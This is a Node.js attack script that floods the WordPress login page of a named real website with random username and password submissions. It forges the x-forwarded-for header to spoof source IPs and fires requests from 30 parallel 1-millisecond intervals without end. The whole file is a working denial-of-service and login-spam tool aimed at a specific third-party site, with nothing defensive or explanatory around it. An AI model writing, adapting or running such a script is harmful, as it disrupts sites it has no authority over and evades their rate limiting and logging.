const { default: axios } = require("axios");
const uid = require("harsh-uid");
const ip = require("./functions/ip");

const hitURL = async () => {
  try {
    const url = `https://bollyflix.meme/wp-login.php`;

    const fd = new FormData();

    fd.append("log", uid(7));
    fd.append("pwd", uid(7));
    fd.append("rememberme", "forever");
    fd.append("wp-submit", "Log In");
    fd.append("redirect_to", "https://bollyflix.meme/wp-admin/");
    fd.append("testcookie", 1);

    const { data } = await axios({
      url,
      data: fd,
      headers: {
        Referer: url,
        "x-forwarded-for": ip(),
        origin: "https://bollyflix.meme",
      },
    });
    // console.log("🚀 ~ file: index.js:26 ~ hitURL ~ data:", data);

    console.log("success");
  } catch (error) {
    // console.error("Error fetching data:", error);
    console.log("fail");
  }
};

// hitURL();

for (let i = 0; i < 30; i++) {
  setInterval(hitURL, 1);
}
